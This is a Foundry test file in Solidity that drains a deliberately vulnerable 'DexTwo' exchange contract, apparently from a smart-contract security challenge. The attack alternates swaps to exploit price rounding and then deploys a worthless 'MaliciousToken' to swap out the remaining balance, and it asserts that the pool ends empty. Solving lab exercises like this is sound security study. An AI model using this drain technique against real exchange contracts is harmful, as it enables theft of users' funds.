// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {DexTwo, SwappableTokenTwo} from "../src/Swap2.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract DexTwoTest is Test {
    SwappableTokenTwo public swappabletokenA;
    SwappableTokenTwo public swappabletokenB;

    DexTwo public dexTwo;
    address attacker = makeAddr("attacker");

    ///DO NOT TOUCH!!!!
    function setUp() public {
        dexTwo = new DexTwo();
        swappabletokenA = new SwappableTokenTwo(address(dexTwo), "Swap", "SW", 110);
        vm.label(address(swappabletokenA), "Token 1");
        swappabletokenB = new SwappableTokenTwo(address(dexTwo), "Swap", "SW", 110);
        vm.label(address(swappabletokenB), "Token 2");
        dexTwo.setTokens(address(swappabletokenA), address(swappabletokenB));

        dexTwo.approve(address(dexTwo), 100);
        dexTwo.add_liquidity(address(swappabletokenA), 100);
        dexTwo.add_liquidity(address(swappabletokenB), 100);

        vm.label(attacker, "Attacker");

        IERC20(address(swappabletokenA)).transfer(attacker, 10);
        IERC20(address(swappabletokenB)).transfer(attacker, 10);
    }

    function test_drainDex2() public {
        console.log("\n===============BEFORE ATTACK DEX 2======================\n");

        console.log("Initial DexTwo Token A Bal ", _dexTwoTokenABal());
        console.log("Initial DexTwo Token B Bal ", _dexTwoTokenBBal());
        console.log("Initial Attacker Token A Bal ", _attackerTokenABal());
        console.log("Initial Attacker Token B Bal ", _attackerTokenBBal());

        console.log("\n===============STARTING ATTACK...======================\n");

        vm.startPrank(attacker);

        dexTwo.approve(address(dexTwo), type(uint256).max);
        dexTwo.swap(address(swappabletokenA), address(swappabletokenB), 10);

        uint256 count;
        while (_dexTwoTokenABal() > _getSwapAmountFromBToA()) {
            console.log("Running round ", ++count, "...");
            dexTwo.swap(address(swappabletokenB), address(swappabletokenA), _attackerTokenBBal());
            dexTwo.swap(address(swappabletokenA), address(swappabletokenB), _attackerTokenABal());
            console.log("Round ", count, " completed");
        }

        console.log("\nOut of the loop!!!\n");

        dexTwo.swap(address(swappabletokenB), address(swappabletokenA), _dexTwoTokenBBal());

        console.log("Deploying and using malicious token to drain left over...\n");

        MaliciousToken maliciousToken = new MaliciousToken(1000);
        maliciousToken.approve(address(dexTwo), type(uint256).max);
        maliciousToken.transfer(address(dexTwo), 100);
        dexTwo.swap(address(maliciousToken), address(swappabletokenB), maliciousToken.balanceOf(address(dexTwo)));

        console.log("DexTwo Token A Bal After Attack", _dexTwoTokenABal());
        console.log("DexTwo Token B Bal After Attack", _dexTwoTokenBBal());
        console.log("Attacker Token A Bal After Attack", _attackerTokenABal());
        console.log("Attacker Token B Bal After Attack", _attackerTokenBBal());
        console.log("\n===============END OF DEX 2 ATTACK======================\n");
        vm.stopPrank();

        assertEq(_dexTwoTokenABal(), 0);
        assertEq(_dexTwoTokenBBal(), 0);
    }

    function _dexTwoTokenABal() private view returns (uint256) {
        return swappabletokenA.balanceOf(address(dexTwo));
    }

    function _dexTwoTokenBBal() private view returns (uint256) {
        return swappabletokenB.balanceOf(address(dexTwo));
    }

    function _attackerTokenABal() private view returns (uint256) {
        return swappabletokenA.balanceOf(attacker);
    }

    function _attackerTokenBBal() private view returns (uint256) {
        return swappabletokenB.balanceOf(attacker);
    }

    function _getSwapAmountFromBToA() private view returns (uint256) {
        return dexTwo.getSwapAmount(address(swappabletokenB), address(swappabletokenA), _attackerTokenBBal());
    }
}

contract MaliciousToken is ERC20 {
    constructor(uint256 initialSupply) ERC20("MaliciousToken", "MLT") {
        _mint(msg.sender, initialSupply);
    }
}
